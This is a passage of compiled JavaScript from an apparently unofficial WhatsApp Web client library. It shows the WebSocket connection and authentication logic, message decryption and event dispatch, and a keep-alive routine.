            const reconnectID = shouldUseReconnect && this.user.jid.replace('@s.whatsapp.net', '@c.us');
            this.conn = new ws_1.default(Constants_1.WS_URL, null, {
                origin: Constants_1.DEFAULT_ORIGIN,
                timeout: this.connectOptions.maxIdleTimeMs,
                agent: options.agent,
                headers: {
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'no-cache',
                    'Host': 'web.whatsapp.com',
                    'Pragma': 'no-cache',
                    'Sec-WebSocket-Extensions': 'permessage-deflate; client_max_window_bits',
                }
            });
            this.conn.on('message', data => this.onMessageRecieved(data));
            this.conn.once('open', async () => {
                this.startKeepAliveRequest();
                this.logger.info(`connected to WhatsApp Web server, authenticating via ${reconnectID ? 'reconnect' : 'takeover'}`);
                try {
                    this.connectionDebounceTimeout.setInterval(this.connectOptions.maxIdleTimeMs);
                    const authResult = await this.authenticate(reconnectID);
                    this.conn
                        .removeAllListeners('error')
                        .removeAllListeners('close');
                    this.connectionDebounceTimeout.start();
                    resolve(authResult);
                }
                catch (error) {
                    reject(error);
                }
            });
            this.conn.on('error', rejectAll);
            this.conn.on('close', () => rejectAll(new Error(Constants_1.DisconnectReason.close)));
        });
        this.on('ws-close', rejectAllOnWSClose);
        try {
            if (delayMs) {
                const { delay, cancel } = Utils.delayCancellable(delayMs);
                rejections.push(cancel);
                await delay;
            }
            const result = await connect();
            return result;
        }
        catch (error) {
            if (this.conn) {
                this.endConnection(error.message);
            }
            throw error;
        }
        finally {
            this.off('ws-close', rejectAllOnWSClose);
        }
    }
    onMessageRecieved(message) {
        var _a, _b;
        if (message[0] === '!') {
            // when the first character in the message is an '!', the server is sending a pong frame
            const timestamp = message.slice(1, message.length).toString('utf-8');
            this.lastSeen = new Date(parseInt(timestamp));
            this.emit('received-pong');
        }
        else {
            let messageTag;
            let json;
            try {
                const dec = Utils.decryptWA(message, (_a = this.authInfo) === null || _a === void 0 ? void 0 : _a.macKey, (_b = this.authInfo) === null || _b === void 0 ? void 0 : _b.encKey, new Decoder_1.default());
                messageTag = dec[0];
                json = dec[1];
            }
            catch (error) {
                this.logger.error({ error }, `encountered error in decrypting message, closing: ${error}`);
                this.unexpectedDisconnect(Constants_1.DisconnectReason.badSession);
            }
            if (this.shouldLogMessages)
                this.messageLog.push({ tag: messageTag, json: JSON.stringify(json), fromMe: false });
            if (!json)
                return;
            if (this.logger.level === 'trace') {
                this.logger.trace(messageTag + ',' + JSON.stringify(json));
            }
            let anyTriggered = false;
            /* Check if this is a response to a message we sent */
            anyTriggered = this.emit(`${DEF_TAG_PREFIX}${messageTag}`, json);
            /* Check if this is a response to a message we are expecting */
            const l0 = json[0] || '';
            const l1 = typeof json[1] !== 'object' || json[1] === null ? {} : json[1];
            const l2 = ((json[2] || [])[0] || [])[0] || '';
            Object.keys(l1).forEach(key => {
                anyTriggered = this.emit(`${DEF_CALLBACK_PREFIX}${l0},${key}:${l1[key]},${l2}`, json) || anyTriggered;
                anyTriggered = this.emit(`${DEF_CALLBACK_PREFIX}${l0},${key}:${l1[key]}`, json) || anyTriggered;
                anyTriggered = this.emit(`${DEF_CALLBACK_PREFIX}${l0},${key}`, json) || anyTriggered;
            });
            anyTriggered = this.emit(`${DEF_CALLBACK_PREFIX}${l0},,${l2}`, json) || anyTriggered;
            anyTriggered = this.emit(`${DEF_CALLBACK_PREFIX}${l0}`, json) || anyTriggered;
            if (anyTriggered)
                return;
            if (this.logger.level === 'debug') {
                this.logger.debug({ unhandled: true }, messageTag + ',' + JSON.stringify(json));
            }
        }
    }
    /** Send a keep alive request every X seconds, server updates & responds with last seen */
    startKeepAliveRequest() {
        this.keepAliveReq && clearInterval(this.keepAliveReq);
        this.keepAliveReq = setInterval(() => {
            if (!this.lastSeen)
                this.lastSeen = new Date();
            const diff = new Date().getTime() - this.lastSeen.getTime();
            /*
                check if it's been a suspicious amount of time since the server responded with our last seen
                it could be that the network is down
            */
            if (diff > Constants_1.KEEP_ALIVE_INTERVAL_MS + 5000)
                this.unexpectedDisconnect(Constants_1.DisconnectReason.lost);
            else if (this.conn)
                this.send('?,,'); // if its all good, send a keep alive request
        }, Constants_1.KEEP_ALIVE_INTERVAL_MS);
    }
}
exports.WAConnection = WAConnection;
